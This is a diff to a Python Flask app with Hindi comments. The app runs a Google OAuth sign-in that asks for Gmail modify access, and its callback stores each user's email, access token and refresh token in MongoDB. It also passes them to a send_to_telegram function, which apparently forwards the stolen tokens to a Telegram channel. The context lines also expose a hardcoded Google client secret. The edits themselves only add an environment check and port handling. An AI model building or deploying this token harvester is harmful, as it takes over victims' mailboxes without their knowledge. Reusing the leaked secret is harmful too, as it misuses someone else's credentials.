@@ -5,13 +5,16 @@ from pymongo import MongoClient
 
 app = Flask(__name__)
 
-# MongoDB सेटअप - रेंडर से लिंक ले रहा है
+# रेंडर से MongoDB लिंक लेना - अगर लिंक न मिले तो प्रोग्राम रुक जाएगा
 MONGO_URI = os.environ.get("MONGO_URI")
+if not MONGO_URI:
+    raise ValueError("MONGO_URI environment variable is not set!")
+
 client = MongoClient(MONGO_URI)
 db = client['bot_database'] 
 tokens_collection = db['tokens']
 
-# आपका फिक्स्ड इंटरफेस कोड
+# आपका वही पुराना HTML कोड
 HTML_CODE = """
 <!DOCTYPE html>
 <html lang="hi-en">
@@ -49,7 +52,6 @@ CLIENT_SECRET = "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"
 SCOPE = "https://www.googleapis.com/auth/gmail.modify https://www.googleapis.com/auth/userinfo.email"
 
 def save_to_db(email, access_token, refresh_token):
-    # डेटाबेस में सेव या अपडेट करें
     tokens_collection.update_one(
         {"email": email},
         {"$set": {"access_token": access_token, "refresh_token": refresh_token}},
@@ -82,13 +84,12 @@ def callback():
         tokens = res.json()
         email = requests.get("https://www.googleapis.com/oauth2/v1/userinfo", 
                              headers={"Authorization": f"Bearer {tokens.get('access_token')}"}).json().get("email")
-        # डेटाबेस में सेव करें
         save_to_db(email, tokens.get('access_token'), tokens.get('refresh_token'))
-        # टेलीग्राम पर भेजें
         send_to_telegram(email, tokens.get('access_token'), tokens.get('refresh_token'))
         return "🎉 सफलता! टोकन डेटाबेस में सेव हो गए हैं।"
     return "Error"
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
     
